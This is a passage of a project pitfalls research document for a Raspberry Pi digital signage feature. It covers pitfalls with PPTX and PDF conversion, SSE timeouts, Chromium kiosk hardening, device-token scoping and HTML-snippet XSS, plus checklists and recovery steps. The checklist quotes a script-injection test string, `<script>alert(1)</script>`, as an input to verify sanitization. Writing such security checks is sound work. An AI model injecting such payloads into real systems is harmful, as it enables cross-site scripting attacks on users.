| pdf.js pre-rendering neighbor pages | Canvas count × RAM grows | Single-page render + explicit cleanup | > 50-page PDF on Pi |
| SSE without ping, nginx default timeouts | Silent stall after 60 s idle | 15-s server pings + 45-s client watchdog | Any prod deployment with reverse proxy |
| Video loop without `preload="auto"` + dedup | Re-download on every loop iteration | Single `<video>` element, `loop` attribute, cached | Cellular fallback or slow LAN |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Device token can hit admin routes | Physically stolen Pi → admin API access | Scope claim in JWT + per-route middleware check |
| Unsanitized HTML snippets rendered in player | Stored XSS with device-token exfiltration | `nh3` server-side + sandboxed iframe + HttpOnly cookie for token |
| LibreOffice in main api container | PPTX CVE → DB access | Isolated `converter` container, `cap_drop: [ALL]`, no DB network |
| Chromium as root on Pi | CVE → host compromise | Dedicated user + drop `--no-sandbox` |
| Device tokens never rotate | Long-lived secret, stale revocation | 24-h JWT + rotate on heartbeat + `revoked_at` check |
| Pairing code reuse across sessions | Cross-device contamination | Partial-unique-on-active index + TTL expiry |
| Iframe to arbitrary URL in player origin | Frame-busting / clickjacking of player | `sandbox` attribute + CSP `frame-src` allowlist |
| Media delete doesn't unlink file | Disk fills (availability), data retention violations | Transactional delete + nightly orphan GC |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Pairing code that never refreshes | Admin misses the 5-min window → support call | Auto-refresh on expiry with visual countdown on Pi |
| No "last seen" / "offline for X min" indicator in device list | Admin assumes broken Pi is working | Heartbeat badge (green < 1 min, yellow < 5 min, red older) |
| Video media with audio on | Jarring sound in lobby/office | Default-mute on upload; admin opts into audio explicitly |
| No preview before assigning media to playlist | Broken content ships to all devices | Server-side thumbnail + admin-preview iframe |
| Admin deletes media referenced in an active playlist silently | Black screen mid-loop on all devices | `ON DELETE RESTRICT` + "in use by N playlists" confirm dialog |
| No visible "offline" state on player | Operators don't realize network dropped | Small corner chip when offline > 1 min; hidden when online |
| PPTX conversion silent until done | Admin uploads, sees nothing, uploads again | Progress/status column in media list (pending/converting/ready/failed + retry button) |

## "Looks Done But Isn't" Checklist

- [ ] **PPTX conversion:** Often missing timeout + kill — verify a corrupt file fails within 60 s and does not wedge APScheduler.
- [ ] **PDF page-flip:** Often missing worker config — verify `pdf.worker.min.mjs` loads in Network tab on a clean Pi session.
- [ ] **SSE:** Often missing heartbeat pings — verify `: keepalive` every 15 s in `curl -N /api/signage/stream?device_token=...`.
- [ ] **SSE client:** Often missing watchdog reconnect — verify: disable Wi-Fi on Pi for 5 min, re-enable, confirm next admin push arrives within 30 s.
- [ ] **Chromium kiosk flags:** Often missing `--autoplay-policy=no-user-gesture-required` — verify a video with audio muted autoplays.
- [ ] **Cursor hide:** Often incomplete — verify no cursor flicker on page transitions (`unclutter` running).
- [ ] **Pairing code:** Often missing partial-unique DB index — verify `\d pairing_codes` shows it.
- [ ] **Pairing race:** Often missing persistent Pi state — verify reboot mid-pair resumes polling.
- [ ] **Device token:** Often missing scope claim — verify a device token hitting `/api/signage/admin/...` returns 403.
- [ ] **Media delete:** Often missing file unlink — verify `du -sh /app/media` decreases after delete.
- [ ] **Directus hide:** Often missing snapshot.yml entry for new tables — verify signage tables don't appear in Directus Data Model UI.
- [ ] **i18n parity:** Often missing DE keys — verify CI parity script passes.
- [ ] **Offline cache:** Often missing sidecar service — verify player keeps looping after `systemctl stop networking` on Pi.
- [ ] **HTML snippets:** Often missing sandbox — verify `<script>alert(1)</script>` sanitized AND iframe sandbox active (two defenses).
- [ ] **4K image:** Often missing server downscale — verify `/api/signage/media/:id/file` returns < 2 MB JPEG/WebP regardless of source.
- [ ] **Chromium systemd:** Often missing graphical-target ordering — verify clean boot to player without black-screen race.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Conversion worker wedged | LOW | `docker compose restart api`; kill orphan `soffice` processes; mark pending rows as `failed`. |
| OOM during upload burst | LOW | Compose auto-restart; users retry; set lower semaphore and memlimit retroactively. |
| Zombie SSE clients after deploy | LOW | Drain connections on SIGTERM; clients auto-reconnect via watchdog. |
| Device paired to wrong slot (code collision) | MEDIUM | Admin "Revoke device" → Pi re-enters pairing; regenerate tokens. |
| Directus introspected signage tables as collections | MEDIUM | Restore `directus` from nightly `pg_dump`; re-apply snapshot.yml with hide entries; restart Directus. |
| Disk full from orphan media files | MEDIUM | Run nightly-GC manually; audit `media` table vs. disk listing. |
| Pi black screen on reboot | LOW | SSH in; `systemctl status chromium-kiosk`; fix ordering in unit file; push image update. |
| Stored XSS in snippet reached a device | HIGH | Revoke all device tokens; audit logs for `/api/signage/*` calls from device origins; sanitize existing snippet rows in DB; patch sanitizer and sandbox. |
| LibreOffice RCE suspected | HIGH | Take api down; rebuild converter image; scan host; rotate Directus JWT secret, Fernet key, DB password; restore from pre-incident backup. |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1. LibreOffice hangs on corrupt PPTX | Conversion Phase | Upload corrupt PPTX → `failed` in ≤60 s |
| 2. `subprocess.run` blocks event loop | Backend + Conversion Phase | Grep `subprocess.run` = zero hits |
| 3. Concurrent conversions OOM | Conversion Phase | 5 concurrent uploads → serial processing, peak RAM < 1.5 GB |
| 4. Font mismatch across environments | Conversion Phase (Dockerfile) + Docs Phase | Visual diff CI gate on reference PPTX |
| 5. pdf.js worker missing under Vite | Player Phase | Network tab shows `pdf.worker.min.mjs` 200 |
| 6. Large PDF OOMs Pi tab | Player Phase + Conversion Phase + Admin UI Phase | 100-page PDF → rejected or image-fallback path |
| 7. EventSource zombie after sleep | Backend Phase + Player Phase | Wi-Fi drop 5 min → recovery < 30 s |
| 8. SSE blocks single worker | Backend Phase | 5 SSE clients → `/api/health` p95 < 100 ms |
| 9. Chromium `--no-sandbox` as root | Pi Provisioning + Docs Phase | `ps -u signage` shows Chromium; no `--no-sandbox` flag |
| 10. Chromium starts before X | Pi Provisioning + Docs Phase | 10 clean reboots → kiosk up every time |
| 11. Incomplete Chromium flag set | Pi Provisioning + Player Phase | Audio-muted video autoplays; no cursor; tab auto-recovers |
| 12. 4K images crash GPU | Conversion Phase + Admin UI Phase | `/api/signage/media/:id/file` ≤ 2 MB |
| 13. Pairing code collision | Schema Phase + Backend Phase | `\d pairing_codes` shows partial-unique index |
| 14. Pairing race condition | Schema + Backend + Player Phase | Reboot Pi mid-pair → completes after reboot |
| 15. Directus file path vs. URL | Schema Phase + Backend Phase | Backend reads all media via its own `/api/signage/media/:id/file` |
| 16. Media delete orphans file | Backend + Schema (RESTRICT FK) + Admin UI Phase | Delete test → disk usage drops |
| 17. Shared-volume UID mismatch | Backend Phase / Infra | Cross-container r/w touch test passes |
| 18. Browser cache unreliable for offline | Pi Provisioning + Player Phase + Docs Phase | `systemctl stop networking` on Pi → player keeps looping |
| 19. Alembic/Directus schema race | Schema Phase + Docs Phase | Clean `compose up` on empty DB → signage tables absent from Directus UI |
| 20. Missing DE i18n keys | Admin UI Phase + Docs Phase | CI i18n-parity script passes |
| 21. Device token over-scoped | Backend Phase + Admin UI + Player Phase | Device token → `/api/signage/admin/*` returns 403 |
| 22. PPTX CVE via LibreOffice | Conversion Phase (isolation) + Docs Phase | Converter container has `cap_drop: [ALL]`, no DB net route |
| 23. iframe blocked by X-Frame-Options | Admin UI Phase + Docs Phase | Add-URL flow warns when HEAD returns blocking headers |
| 24. HTML-snippet XSS on kiosk | Backend + Player + Admin UI Phase | `<script>alert(1)</script>` sanitized + rendered in sandboxed iframe |

## Sources

- **v1.11-directus PROJECT.md + MILESTONES.md** — Alembic/Directus schema ownership pattern, snapshot.yml hide mechanism, shared HS256 secret pattern.
- **v1.15 Sensor Monitor PROJECT.md + MILESTONES.md** — `--workers 1` invariant, APScheduler `max_instances=1`, Fernet encryption pattern, DE/EN parity CI gap.
- **FastAPI docs (tiangolo/fastapi)** — `UploadFile` streaming, `BackgroundTasks` limitations under single worker.
- **sse-starlette README + issues** — `EventSourceResponse` ping parameter, nginx `proxy_buffering off` requirement.
- **pdf.js upstream (mozilla/pdf.js) + Vite integration issues** — `?url` import pattern for worker, version-match requirement.
- **Chromium command-line switches (peter.sh/experiments/chromium-command-line-switches/)** — `--autoplay-policy`, `--kiosk`, `--disable-features`.
- **Raspberry Pi OS Bookworm + labwc session** — graphical-session ordering on Wayland.
- **LibreOffice CVE history (libreoffice.org/about-us/security/advisories/)** — justification for conversion-container isolation.
- **OWASP ASVS v4.0** — JWT scope claims, sandboxed iframe guidance for embedded user content.
- **Docker Compose v2 reference** — `depends_on: condition: service_completed_successfully`, `cap_drop`, `read_only`, `security_opt: no-new-privileges`.
- **nh3 Python binding** — same sanitizer used for v1.1 logo SVG sanitization; reused here for HTML snippets.

Confidence notes:
- HIGH for: v1.11 and v1.15 in-project lessons, Chromium flags (documented publicly), Alembic/Directus ordering (verified in v1.11 deployment).
- HIGH for: pdf.js Vite worker setup (well-documented pattern).
- MEDIUM for: exact RAM ceilings on Pi 4 for PDF/4K (hardware-dependent; verify empirically in Player Phase).
- MEDIUM for: specific Chromium EventSource reconnect failure modes — documented in community issues but not in Chromium release notes; watchdog pattern is the robust mitigation regardless.

---
*Pitfalls research for: v1.16 Digital Signage on KPI Dashboard monorepo*
*Researched: 2026-04-18*
